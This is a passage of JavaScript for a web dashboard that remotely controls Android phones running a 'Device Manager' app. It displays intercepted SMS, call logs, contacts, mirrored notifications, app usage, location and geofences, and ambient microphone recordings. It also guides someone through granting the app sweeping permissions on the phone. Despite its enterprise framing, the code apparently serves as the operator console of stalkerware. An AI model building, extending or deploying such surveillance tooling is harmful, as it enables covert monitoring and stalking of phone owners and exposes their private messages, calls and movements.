        <div style="background: rgba(255,255,255,0.02); border: 1px solid var(--border); padding: 12px 14px; border-radius: 6px; font-size: 0.88rem; line-height: 1.5; white-space: pre-wrap;">
          ${escapeHtml(text || 'No Message Body Content Captured')}
        </div>
      </div>
      <div style="margin-top: 10px; border-top: 1px solid var(--border); padding-top: 16px;">
        <span class="text-muted" style="font-size: 0.72rem; display: block; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px;">Device Routing Details</span>
        <div style="display: flex; flex-direction: column; gap: 4px; font-size: 0.78rem;">
          <div style="display: flex; justify-content: space-between;"><span class="text-muted">Target App Package:</span> <span>${escapeHtml(appName)}</span></div>
          <div style="display: flex; justify-content: space-between;"><span class="text-muted">Capture Channel:</span> <span>Android NotificationListenerService</span></div>
          <div style="display: flex; justify-content: space-between;"><span class="text-muted">Transport protocol:</span> <span>Secure WebSocket Uplink</span></div>
        </div>
      </div>
    </div>
  `;
  openConsoleDrawer('Notification Details', html);
};

window.openPermissionDrawer = function(label, code, isGranted) {
  const guides = {
    location: {
      desc: "Allows the enterprise admin console to request live GPS updates, accuracy readings, and build movement maps.",
      guide: "1. Open <b>Settings</b> on the Android device.<br>2. Navigate to <b>Apps & Notifications</b> -> <b>Device Manager</b>.<br>3. Tap <b>Permissions</b> -> <b>Location</b>.<br>4. Select <b>Allow all the time</b>.<br>5. Turn on <b>Use precise location</b> for high precision tracking."
    },
    notification_access: {
      desc: "Intercepts and mirrors push notifications in real-time. Crucial for live social activity auditing.",
      guide: "1. Open <b>Settings</b> on the Android device.<br>2. Search for <b>Notification Access</b> or <b>Device & App Notifications</b>.<br>3. Locate <b>Device Manager</b> from the list.<br>4. Toggle the switch to <b>Allowed</b>.<br>5. Agree to the system alert prompt."
    },
    files_access: {
      desc: "Required for the diagnostic file manager to index storage directories and enable direct backup transfers.",
      guide: "1. Open <b>Settings</b> on the Android device.<br>2. Navigate to <b>Apps</b> -> <b>Device Manager</b>.<br>3. Tap <b>Permissions</b> -> <b>Files and Media</b>.<br>4. Select <b>Allow management of all files</b> (or Allow access to media only on Android 13+)."
    },
    camera: {
      desc: "Required to capture instant photo diagnostics on demand.",
      guide: "1. Open <b>Settings</b> -> <b>Apps</b> -> <b>Device Manager</b>.<br>2. Tap <b>Permissions</b> -> <b>Camera</b>.<br>3. Select <b>Allow only while using the app</b>."
    },
    microphone: {
      desc: "Enables diagnostic background ambient audio logs to monitor device surroundings.",
      guide: "1. Open <b>Settings</b> -> <b>Apps</b> -> <b>Device Manager</b>.<br>2. Tap <b>Permissions</b> -> <b>Microphone</b>.<br>3. Select <b>Allow only while using the app</b>."
    },
    usage_access: {
      desc: "Powers the Usage Analytics graphs by monitoring app launch history and active foreground times.",
      guide: "1. Open <b>Settings</b> on the Android device.<br>2. Search for <b>Usage Access</b> or <b>Usage Data Access</b>.<br>3. Find <b>Device Manager</b> in the list.<br>4. Enable the <b>Permit usage access</b> toggle."
    },
    screen_sharing: {
      desc: "Allows real-time streaming sessions of the device screen to the admin command center.",
      guide: "This feature uses Google MediaProjection. When the administrative console starts a Screen Session, a consent dialog will pop up on the Android device screen. The device owner must tap <b>Start Now</b> to authorize the video frame transmission."
    }
  };

  const item = guides[code] || { desc: "Access permission required by the administration terminal.", guide: "Enable this permission in Settings -> Apps -> Device Manager." };

  const html = `
    <div style="display: flex; flex-direction: column; gap: 16px; margin-top: 10px;">
      <div style="display: flex; align-items: center; gap: 12px; background: ${isGranted ? 'rgba(16, 185, 129, 0.05)' : 'rgba(239, 68, 68, 0.05)'}; padding: 12px; border-radius: 8px; border: 1px solid var(--border);">
        <div style="font-size: 1.8rem;">${isGranted ? '🛡️' : '⚠️'}</div>
        <div>
          <h4 style="margin: 0; font-size: 1rem; color: ${isGranted ? '#10b981' : '#f87171'}">${escapeHtml(label)}</h4>
          <span style="font-size: 0.75rem; font-weight: bold; color: var(--text-muted);">${isGranted ? 'GRANTED' : 'NOT GRANTED'}</span>
        </div>
      </div>
      <div>
        <span class="text-muted" style="font-size: 0.72rem; display: block; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">Functional Description</span>
        <div style="background: rgba(255,255,255,0.02); border: 1px solid var(--border); padding: 10px 14px; border-radius: 6px; font-size: 0.85rem; line-height: 1.4;">
          ${item.desc}
        </div>
      </div>
      <div>
        <span class="text-muted" style="font-size: 0.72rem; display: block; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;">How to enable this capability</span>
        <div style="background: rgba(255,255,255,0.02); border: 1px solid var(--border); padding: 12px 14px; border-radius: 6px; font-size: 0.85rem; line-height: 1.5;">
          ${item.guide}
        </div>
      </div>
      <div style="margin-top: 10px; border-top: 1px solid var(--border); padding-top: 16px; display: flex; justify-content: flex-end;">
        <button class="btn btn-secondary btn-sm" onclick="dispatchCommand(currentDevice.id, 'REFRESH_PERMISSIONS'); closeConsoleDrawer();">Refresh Permissions</button>
      </div>
    </div>
  `;
  openConsoleDrawer('Permission Reference', html);
};

// OPERATIONS TIMELINE MULTIPLEXER
window.pushConsoleTimeline = function(type, title, detail, level = 'info') {
  const time = new Date().toLocaleTimeString();
  const ev = { time, type, title, detail, level };
  consoleTimelineEvents.unshift(ev); // prepend newest
  if (consoleTimelineEvents.length > 50) {
    consoleTimelineEvents.pop();
  }
  renderConsoleTimeline();
};

window.renderConsoleTimeline = function() {
  const container = document.getElementById('console-timeline-container');
  if (!container) return;
  
  const filtered = consoleTimelineEvents.filter(ev => {
    if (activeTimelineFilter === 'ALL') return true;
    return ev.type === activeTimelineFilter;
  });
  
  if (filtered.length === 0) {
    container.innerHTML = '<div class="empty-state" style="padding: 15px; font-size: 0.78rem;">No timeline activities found in this category.</div>';
    return;
  }
  
  container.innerHTML = filtered.map(ev => `
    <div class="timeline-item ${ev.level}">
      <div class="timeline-item-time">${ev.time}</div>
      <div class="timeline-item-content">
        <div class="timeline-item-title">${escapeHtml(ev.title)}</div>
        <div class="text-muted" style="margin-top: 2px;">${escapeHtml(ev.detail)}</div>
      </div>
    </div>
  `).join('');
};

window.filterConsoleTimeline = function(filter) {
  activeTimelineFilter = filter;
  // Update UI active tab state
  ['ALL', 'LOCATION', 'NOTIFICATIONS', 'COMMANDS', 'SYSTEM'].forEach(f => {
    const btn = document.getElementById(`btn-timeline-filter-${f}`);
    if (btn) {
      if (f === filter) {
        btn.classList.add('active');
      } else {
        btn.classList.remove('active');
      }
    }
  });
  renderConsoleTimeline();
};

// LIVE HEARTBEAT SIGNAL INTERRUPT TRACKER
function startHeartbeatTracker() {
  if (heartbeatInterval) clearInterval(heartbeatInterval);
  lastHeartbeatTime = Date.now();
  
  const lbl = document.getElementById('lbl-heartbeat');
  if (lbl) lbl.textContent = 'LAST HEARTBEAT: JUST NOW';
  
  heartbeatInterval = setInterval(() => {
    if (!lastHeartbeatTime) return;
    const elapsed = Math.round((Date.now() - lastHeartbeatTime) / 1000);
    const lbl = document.getElementById('lbl-heartbeat');
    if (lbl) {
      if (elapsed < 5) {
        lbl.textContent = 'LAST HEARTBEAT: JUST NOW';
      } else {
        lbl.textContent = `LAST HEARTBEAT: ${elapsed} SEC AGO`;
      }
    }
  }, 1000);
}

function resetHeartbeatTime() {
  lastHeartbeatTime = Date.now();
  const lbl = document.getElementById('lbl-heartbeat');
  if (lbl) lbl.textContent = 'LAST HEARTBEAT: JUST NOW';
}

window.switchConsoleTab = function(tabId) {
  const btn = document.querySelector(`.tab-btn[data-tab="${tabId}"]`);
  if (btn) {
    btn.click();
    // Scroll tabs bar to make it visible
    const tabsBar = document.querySelector('.tabs-bar');
    if (tabsBar) {
      const btnOffset = btn.offsetLeft;
      tabsBar.scrollTo({ left: btnOffset - 50, behavior: 'smooth' });
    }
  }
};

function escapeJs(str) {
  if (!str) return '';
  return str.replace(/'/g, "\\'").replace(/"/g, '\\"');
}

// Device Notifications
async function loadDeviceNotifications(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/notifications`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    const notifs = await res.json();
    
    // Update legacy table
    const tbody = document.getElementById('notif-table-body');
    if (tbody) {
      if (notifs.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" class="text-center">No notifications recorded</td></tr>';
      } else {
        tbody.innerHTML = notifs.map(n => `
          <tr style="cursor: pointer;" onclick="openNotificationDrawer('${escapeJs(n.app_name || n.package_name)}', '${escapeJs(n.title || '')}', '${escapeJs(n.text || '')}', '${new Date(Number(n.post_time)).toLocaleString()}')">
            <td><b style="color: #818cf8;">${escapeHtml(n.app_name || n.package_name)}</b></td>
            <td>${escapeHtml(n.title || '')}</td>
            <td style="max-width: 320px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${escapeHtml(n.text || '')}</td>
            <td>${new Date(Number(n.post_time)).toLocaleTimeString()}</td>
            <td onclick="event.stopPropagation()"><button class="btn-icon" onclick="deleteNotification('${deviceId}', '${n.id}')">🗑️</button></td>
          </tr>
        `).join('');
      }
    }

    // Update new Operations Console sidebar list
    const consoleNotifContainer = document.getElementById('console-notif-container');
    const badge = document.getElementById('lbl-notif-badge');
    if (badge) badge.textContent = notifs.length;
    if (consoleNotifContainer) {
      if (notifs.length === 0) {
        consoleNotifContainer.innerHTML = '<div class="empty-state">No push notifications received yet. Waiting for device stream...</div>';
      } else {
        consoleNotifContainer.innerHTML = notifs.slice(0, 5).map(n => `
          <div class="perm-row" onclick="openNotificationDrawer('${escapeJs(n.app_name || n.package_name)}', '${escapeJs(n.title || '')}', '${escapeJs(n.text || '')}', '${new Date(Number(n.post_time)).toLocaleString()}')" style="display: flex; align-items: flex-start; gap: 10px; background: rgba(255,255,255,0.01); border: 1px solid var(--border); border-radius: 8px; padding: 10px; cursor: pointer; transition: background 0.2s;">
            <div style="background: rgba(129, 140, 248, 0.1); border-radius: 6px; padding: 6px; display: flex; align-items: center; justify-content: center; font-size: 1.1rem; line-height: 1;">🔔</div>
            <div style="flex: 1; min-width: 0;">
              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2px;">
                <span style="font-weight: 600; font-size: 0.8rem; color: #818cf8; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${escapeHtml(n.app_name || n.package_name)}</span>
                <span style="font-size: 0.7rem; color: var(--text-muted); flex-shrink: 0;">${new Date(Number(n.post_time)).toLocaleTimeString()}</span>
              </div>
              <div style="font-weight: 500; font-size: 0.82rem; color: var(--text-main); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${escapeHtml(n.title || 'No Title')}</div>
              <div style="font-size: 0.76rem; color: var(--text-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 1px;">${escapeHtml(n.text || 'No content')}</div>
            </div>
          </div>
        `).join('');
      }
    }
  } catch (_) {}
}

window.deleteNotification = async function(deviceId, notifId) {
  await fetch(`/api/devices/${deviceId}/notifications/${notifId}`, {
    method: 'DELETE',
    headers: { 'Authorization': `Bearer ${authToken}` }
  });
  loadDeviceNotifications(deviceId);
};

function appendNotificationFeed(n) {
  const feed = document.getElementById('overview-notifications-list');
  if (feed) {
    const empty = feed.querySelector('.empty-state');
    if (empty) empty.remove();

    const item = document.createElement('div');
    item.style.padding = '10px 0';
    item.style.borderBottom = '1px solid var(--border)';
    item.innerHTML = `
      <div style="font-weight: 600; font-size: 0.88rem;">${escapeHtml(n.appName || n.package_name)}: ${escapeHtml(n.title)}</div>
      <div style="font-size: 0.8rem; color: var(--text-muted);">${escapeHtml(n.text)}</div>
      <div style="font-size: 0.72rem; color: #818cf8; margin-top: 2px;">${new Date().toLocaleTimeString()}</div>
    `;
    feed.prepend(item);
  }
}

// Applications Inventory
async function loadDeviceApps(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/apps`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    const apps = await res.json();
    const tbody = document.getElementById('apps-table-body');
    if (apps.length === 0) {
      tbody.innerHTML = '<tr><td colspan="4" class="text-center">No applications inventoried. Click "Refresh Inventory".</td></tr>';
      return;
    }
    tbody.innerHTML = apps.map(a => `
      <tr>
        <td><b>${escapeHtml(a.app_name || a.appName)}</b></td>
        <td style="font-family: monospace; font-size: 0.82rem;">${escapeHtml(a.package_name || a.packageName)}</td>
        <td>v${escapeHtml(a.version_name || a.versionName || '1.0')}</td>
        <td><span class="pill ${a.is_system_app || a.isSystemApp ? 'pill-offline' : 'pill-online'}">${a.is_system_app || a.isSystemApp ? 'SYSTEM' : 'USER'}</span></td>
      </tr>
    `).join('');
  } catch (_) {}
}

// App Usage
async function loadDeviceUsage(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/usage`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    const usage = await res.json();
    
    // Update legacy usage panel
    const container = document.getElementById('usage-list');
    if (container) {
      if (usage.length === 0) {
        container.innerHTML = '<div class="empty-state">No app usage stats recorded. Click "Refresh Stats".</div>';
      } else {
        const maxTime = Math.max(...usage.map(u => Number(u.total_time_ms || 1)));
        container.innerHTML = usage.slice(0, 10).map(u => {
          const minutes = Math.round(Number(u.total_time_ms) / 60000);
          const pct = Math.min(100, Math.round((Number(u.total_time_ms) / maxTime) * 100));
          return `
            <div style="margin-bottom: 14px;">
              <div style="display: flex; justify-content: space-between; font-size: 0.85rem; margin-bottom: 4px;">
                <span><b>${escapeHtml(u.app_name || u.package_name)}</b></span>
                <span style="color: var(--text-muted);">${minutes} mins</span>
              </div>
              <div class="progress-bar"><div class="progress-fill cyan" style="width: ${pct}%;"></div></div>
            </div>
          `;
        }).join('');
      }
    }

    // Update new Operations Console horizontal bar chart
    const consoleUsageChart = document.getElementById('console-usage-chart');
    if (consoleUsageChart) {
      if (usage.length === 0) {
        consoleUsageChart.innerHTML = '<div class="empty-state">No app usage stats retrieved. Click "Sync Usage Stats" to load.</div>';
      } else {
        const maxTime = Math.max(...usage.map(u => Number(u.total_time_ms || 1)));
        consoleUsageChart.innerHTML = usage.slice(0, 5).map(u => {
          const minutes = Math.round(Number(u.total_time_ms) / 60000);
          const pct = Math.min(100, Math.round((Number(u.total_time_ms) / maxTime) * 100));
          return `
            <div style="margin-bottom: 8px;">
              <div style="display: flex; justify-content: space-between; font-size: 0.78rem; margin-bottom: 3px;">
                <span style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 70%;"><b>${escapeHtml(u.app_name || u.package_name)}</b></span>
                <span style="color: var(--text-muted); font-size: 0.72rem; flex-shrink: 0;">${minutes} mins</span>
              </div>
              <div class="progress-bar" style="height: 6px;"><div class="progress-fill cyan" style="width: ${pct}%;"></div></div>
            </div>
          `;
        }).join('');
      }
    }
  } catch (_) {}
}

// Command Center
function setupCommandButtons() {
  document.querySelectorAll('.cmd-tile').forEach(btn => {
    btn.addEventListener('click', async () => {
      const cmdType = btn.getAttribute('data-cmd');
      if (!currentDevice) return;
      await dispatchCommand(currentDevice.id, cmdType);
    });
  });

  document.getElementById('btn-cmd-sync').addEventListener('click', () => {
    if (currentDevice) dispatchCommand(currentDevice.id, 'SYNC_DEVICE');
  });

  document.getElementById('btn-cmd-location').addEventListener('click', () => {
    if (currentDevice) dispatchCommand(currentDevice.id, 'REQUEST_LOCATION');
  });

  document.getElementById('btn-request-apps').addEventListener('click', () => {
    if (currentDevice) dispatchCommand(currentDevice.id, 'REQUEST_APPS');
  });

  document.getElementById('btn-request-usage').addEventListener('click', () => {
    if (currentDevice) dispatchCommand(currentDevice.id, 'REQUEST_USAGE');
  });

  document.getElementById('btn-disconnect-device').addEventListener('click', async () => {
    if (!currentDevice) return;
    if (confirm(`Are you sure you want to disconnect ${currentDevice.device_name}?`)) {
      await fetch(`/api/devices/${currentDevice.id}/disconnect`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${authToken}` }
      });
      loadDevices();
      showView('devices');
    }
  });
}

async function dispatchCommand(deviceId, commandType, parameters = {}) {
  if (commandType === 'SEND_NOTIFICATION') {
    const msg = prompt('Enter alert message to display on the Android device:');
    if (!msg) return;
    parameters = { title: 'Admin Alert', message: msg };
  }

  try {
    const res = await fetch(`/api/devices/${deviceId}/commands`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${authToken}`
      },
      body: JSON.stringify({ commandType, parameters })
    });
    const data = await res.json();
    alert(`Command ${commandType} dispatched! (Status: ${data.status})`);
    loadDeviceCommands(deviceId);
  } catch (err) {
    alert('Error dispatching command: ' + err.message);
  }
}

window.sendSyncFilesCommand = function() {
  if (currentDevice) {
    dispatchCommand(currentDevice.id, 'SYNC_FILES');
  } else {
    alert("No active device selected.");
  }
};

async function loadDeviceCommands(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/commands`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    const cmds = await res.json();
    
    // Update legacy commands log table
    const tbody = document.getElementById('commands-table-body');
    if (tbody) {
      if (cmds.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" class="text-center">No commands dispatched yet</td></tr>';
      } else {
        tbody.innerHTML = cmds.map(c => {
          const statusPill = c.status === 'COMPLETED' ? 'pill-online' : (c.status === 'FAILED' ? 'pill-offline' : 'pill');
          return `
            <tr>
              <td style="font-family: monospace; font-size: 0.8rem;">${escapeHtml(c.id || c.commandId || '')}</td>
              <td><b>${escapeHtml(c.command_type || c.commandType || '')}</b></td>
              <td><span class="pill ${statusPill}">${c.status}</span></td>
              <td style="font-size: 0.82rem;">${escapeHtml(c.result || c.error_message || c.errorMessage || '--')}</td>
              <td>${new Date(Number(c.timestamp)).toLocaleTimeString()}</td>
            </tr>
          `;
        }).join('');
      }
    }

    // Update Command Lifecycle Hub Table
    renderCommandLifecycle(cmds);

    // Update tile statuses on console dashboard
    const commandTypes = [
      'REQUEST_LOCATION', 'SYNC_FILES', 'SYNC_NOTIFICATIONS', 
      'SYNC_CONTACTS', 'SYNC_APPLICATIONS', 'SYNC_USAGE', 
      'REFRESH_TELEMETRY', 'REFRESH_PERMISSIONS'
    ];
    commandTypes.forEach(type => {
      const statusEl = document.getElementById(`status-${type}`);
      if (statusEl) {
        // Find latest command of this type
        const latest = cmds.find(c => (c.command_type || c.commandType) === type);
        if (latest) {
          statusEl.textContent = latest.status;
          if (latest.status === 'COMPLETED') {
            statusEl.style.color = '#34d399'; // green
          } else if (latest.status === 'FAILED') {
            statusEl.style.color = '#f87171'; // red
          } else if (latest.status === 'QUEUED' || latest.status === 'SENDING' || latest.status === 'RECEIVED' || latest.status === 'EXECUTING') {
            statusEl.innerHTML = `<span style="display: inline-block; animation: pulse-ring 1.5s infinite;">⏳ ${latest.status}</span>`;
            statusEl.style.color = '#f59e0b'; // amber
          } else {
            statusEl.style.color = 'var(--text-muted)';
          }
        } else {
          statusEl.textContent = 'Idle';
          statusEl.style.color = 'var(--text-muted)';
        }
      }
    });
  } catch (_) {}
}

window.fetchCommandHistory = function() {
  if (currentDevice) {
    loadDeviceCommands(currentDevice.id);
  }
};

function renderCommandLifecycle(cmds) {
  const tbody = document.getElementById('tbody-command-lifecycle');
  if (!tbody) return;
  if (!cmds || cmds.length === 0) {
    tbody.innerHTML = '<tr><td colspan="5" class="text-center text-muted" style="padding: 16px;">No remote commands dispatched yet.</td></tr>';
    return;
  }
  tbody.innerHTML = cmds.slice(0, 20).map(c => {
    let pillClass = 'pill';
    if (c.status === 'COMPLETED') pillClass = 'pill pill-online';
    else if (c.status === 'FAILED') pillClass = 'pill pill-offline';
    else if (c.status === 'EXECUTING') pillClass = 'pill purple';
    else if (c.status === 'SENDING' || c.status === 'QUEUED') pillClass = 'pill';
    
    return `
      <tr>
        <td><b>${escapeHtml(c.command_type || c.commandType || '')}</b></td>
        <td><span class="${pillClass}">${c.status}</span></td>
        <td style="font-family: monospace; font-size: 0.8rem;">${escapeHtml(c.device_id || currentDevice?.id || '--')}</td>
        <td style="font-size: 0.82rem;">${new Date(Number(c.timestamp)).toLocaleTimeString()}</td>
        <td style="font-size: 0.8rem; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
          ${escapeHtml(c.result || c.error_message || c.errorMessage || '--')}
        </td>
      </tr>
    `;
  }).join('');
}

window.triggerCommandAction = async function(cmdType) {
  if (!currentDevice) {
    alert("No active device selected.");
    return;
  }
  const deviceId = currentDevice.id;
  const statusEl = document.getElementById(`status-${cmdType}`);
  if (statusEl) {
    statusEl.innerHTML = `<span style="display: inline-block; animation: pulse-ring 1.5s infinite;">⏳ SENDING</span>`;
    statusEl.style.color = '#38bdf8';
  }

  try {
    const res = await fetch(`/api/devices/${deviceId}/commands`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${authToken}`
      },
      body: JSON.stringify({ commandType: cmdType, parameters: {} })
    });
    const data = await res.json();
    if (res.ok) {
      pushConsoleTimeline('COMMANDS', 'Command Dispatched', `Command ${cmdType} sent (${data.status})`, 'info');
      loadDeviceCommands(deviceId);
    } else {
      if (statusEl) {
        statusEl.textContent = 'FAILED';
        statusEl.style.color = '#f87171';
      }
      alert(`Error dispatching ${cmdType}: ` + (data.error || 'Unknown error'));
    }
  } catch (err) {
    if (statusEl) {
      statusEl.textContent = 'ERROR';
      statusEl.style.color = '#f87171';
    }
    alert('Failed to send command: ' + err.message);
  }
};

// Geofencing Management
let currentGeofences = [];
let geofenceMapCircles = [];

async function loadGeofences(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/geofences`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    currentGeofences = await res.json();
    renderGeofences(currentGeofences);
    drawGeofencesOnMap(currentGeofences);
  } catch (err) {
    console.error('Error loading geofences:', err);
  }
}

function renderGeofences(list) {
  const container = document.getElementById('geofence-list-container');
  if (!container) return;
  if (list.length === 0) {
    container.innerHTML = '<div class="empty-state">No geofences configured. Click "+ New Geofence" to define a boundary.</div>';
    return;
  }
  container.innerHTML = list.map(g => {
    const isInside = g.last_status === 'INSIDE';
    const statusPill = isInside ? '<span class="pill pill-online">INSIDE ZONE</span>' : '<span class="pill pill-offline">OUTSIDE ZONE</span>';
    return `
      <div style="background: var(--bg-surface); padding: 10px 14px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(255,255,255,0.05);">
        <div>
          <div style="font-weight: 600; font-size: 0.9rem;">📍 ${escapeHtml(g.name)}</div>
          <div style="font-size: 0.74rem; color: var(--text-muted);">
            Radius: ${g.radius_meters}m • Lat: ${Number(g.latitude).toFixed(4)}, Lng: ${Number(g.longitude).toFixed(4)}
          </div>
        </div>
        <div style="display: flex; align-items: center; gap: 8px;">
          ${statusPill}
          <button class="btn btn-danger btn-sm" onclick="deleteGeofence(${g.id})" style="padding: 2px 8px; font-size: 0.75rem;">Delete</button>
        </div>
      </div>
    `;
  }).join('');
}

function drawGeofencesOnMap(list) {
  if (!consoleMap) return;
  geofenceMapCircles.forEach(c => {
    try { consoleMap.removeLayer(c); } catch (_) {}
  });
  geofenceMapCircles = [];

  list.forEach(g => {
    if (g.latitude && g.longitude) {
      const circle = L.circle([g.latitude, g.longitude], {
        color: '#38bdf8',
        fillColor: '#38bdf8',
        fillOpacity: 0.15,
        radius: Number(g.radius_meters) || 500
      }).addTo(consoleMap);
      circle.bindPopup(`<b>${escapeHtml(g.name)}</b><br>Radius: ${g.radius_meters}m`);
      geofenceMapCircles.push(circle);
    }
  });
}

window.openAddGeofenceModal = function() {
  document.getElementById('geofence-modal').classList.remove('hidden');
  if (currentDevice && currentDevice.latitude && currentDevice.longitude) {
    document.getElementById('geo-input-lat').value = currentDevice.latitude;
    document.getElementById('geo-input-lng').value = currentDevice.longitude;
  }
};

window.closeAddGeofenceModal = function() {
  document.getElementById('geofence-modal').classList.add('hidden');
};

window.populateGeofenceWithCurrentLocation = function() {
  if (currentDevice && currentDevice.latitude && currentDevice.longitude) {
    document.getElementById('geo-input-lat').value = currentDevice.latitude;
    document.getElementById('geo-input-lng').value = currentDevice.longitude;
  } else {
    alert("No current device coordinates available. Enter manually or click 'Locate'.");
  }
};

window.submitNewGeofence = async function() {
  if (!currentDevice) return;
  const name = document.getElementById('geo-input-name').value.trim();
  const lat = parseFloat(document.getElementById('geo-input-lat').value);
  const lng = parseFloat(document.getElementById('geo-input-lng').value);
  const radius = parseInt(document.getElementById('geo-input-radius').value, 10);

  if (!name || isNaN(lat) || isNaN(lng)) {
    alert('Please enter a valid Zone Name and Latitude/Longitude coordinates.');
    return;
  }

  try {
    const res = await fetch(`/api/devices/${currentDevice.id}/geofences`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${authToken}`
      },
      body: JSON.stringify({
        name,
        latitude: lat,
        longitude: lng,
        radiusMeters: radius || 500,
        isActive: true
      })
    });
    if (res.ok) {
      closeAddGeofenceModal();
      loadGeofences(currentDevice.id);
      pushConsoleTimeline('LOCATION', 'Geofence Created', `Configured perimeter: ${name} (${radius || 500}m radius)`, 'success');
    } else {
      const errData = await res.json();
      alert('Failed to save geofence: ' + (errData.error || 'Server error'));
    }
  } catch (err) {
    alert('Error saving geofence: ' + err.message);
  }
};

window.deleteGeofence = async function(id) {
  if (!currentDevice || !confirm('Delete this geofence boundary?')) return;
  try {
    const res = await fetch(`/api/devices/${currentDevice.id}/geofences/${id}`, {
      method: 'DELETE',
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (res.ok) {
      loadGeofences(currentDevice.id);
      pushConsoleTimeline('LOCATION', 'Geofence Deleted', `Removed perimeter #${id}`, 'info');
    }
  } catch (err) {
    console.error('Error deleting geofence:', err);
  }
};

// Audio Recordings
async function loadDeviceRecordings(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/recordings`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    const recs = await res.json();
    const container = document.getElementById('recordings-list');
    if (recs.length === 0) {
      container.innerHTML = '<div class="empty-state">No audio diagnostic recordings available.</div>';
      return;
    }
    container.innerHTML = recs.map(r => `
      <div style="background: var(--bg-surface); padding: 14px; border-radius: 8px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between;">
        <div>
          <div style="font-weight: 600;">${escapeHtml(r.file_name)}</div>
          <div style="font-size: 0.78rem; color: var(--text-muted);">${new Date(r.created_at).toLocaleString()} • ${(r.duration_ms / 1000).toFixed(1)}s</div>
        </div>
        <audio controls src="${r.file_path}" style="height: 36px;"></audio>
      </div>
    `).join('');
  } catch (_) {}
}

// Global caching for local search filtering
let deviceSMSCache = [];
let deviceContactsCache = [];

// Intercepted SMS logs
async function loadDeviceSMS(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/sms`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    deviceSMSCache = await res.json();
    renderSMSList(deviceSMSCache);
  } catch (_) {}
}

function renderSMSList(list) {
  const tbody = document.getElementById('sms-table-body');
  if (list.length === 0) {
    tbody.innerHTML = '<tr><td colspan="4" class="text-center">No SMS messages intercepted</td></tr>';
    return;
  }
  tbody.innerHTML = list.map(s => {
    const isInbox = (s.type || s.type === 'INBOX');
    const badge = isInbox ? '<span class="pill pill-online">INCOMING</span>' : '<span class="pill purple">SENT</span>';
    return `
      <tr>
        <td>${badge}</td>
        <td><b>${escapeHtml(s.address)}</b></td>
        <td><div style="max-width: 450px; overflow-wrap: break-word;">${escapeHtml(s.body)}</div></td>
        <td>${new Date(Number(s.timestamp)).toLocaleString()}</td>
      </tr>
    `;
  }).join('');
}

function filterSMS(query) {
  const q = query.toLowerCase();
  const filtered = deviceSMSCache.filter(s => 
    (s.address && s.address.toLowerCase().includes(q)) || 
    (s.body && s.body.toLowerCase().includes(q))
  );
  renderSMSList(filtered);
}

// Intercepted Call Logs
async function loadDeviceCalls(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/calls`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    const calls = await res.json();
    const tbody = document.getElementById('calls-table-body');
    if (calls.length === 0) {
      tbody.innerHTML = '<tr><td colspan="5" class="text-center">No call logs captured</td></tr>';
      return;
    }
    tbody.innerHTML = calls.map(c => {
      let badge = '<span class="pill pill-online">INCOMING</span>';
      if (c.type === 'OUTGOING') badge = '<span class="pill purple">OUTGOING</span>';
      if (c.type === 'MISSED') badge = '<span class="pill pill-offline">MISSED</span>';

      const durationMin = Math.floor(c.duration / 60);
      const durationSec = c.duration % 60;
      const durationStr = c.duration > 0 ? `${durationMin}m ${durationSec}s` : '0s';

      return `
        <tr>
          <td>${badge}</td>
          <td><b>${escapeHtml(c.number)}</b></td>
          <td>${escapeHtml(c.name || '--')}</td>
          <td>${durationStr}</td>
          <td>${new Date(Number(c.timestamp)).toLocaleString()}</td>
        </tr>
      `;
    }).join('');
  } catch (_) {}
}

// Intercepted Contacts
async function loadDeviceContacts(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/contacts`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    deviceContactsCache = await res.json();
    renderContacts(deviceContactsCache);
  } catch (_) {}
}

function renderContacts(list) {
  const container = document.getElementById('contacts-list-container');
  if (list.length === 0) {
    container.innerHTML = '<div class="empty-state" style="grid-column: span 3;">No device contacts synced.</div>';
    return;
  }
  container.innerHTML = list.map(c => `
    <div class="contact-card" style="background: var(--bg-surface); padding: 14px; border-radius: 8px; border: 1px solid var(--border); display: flex; align-items: center; gap: 12px;">
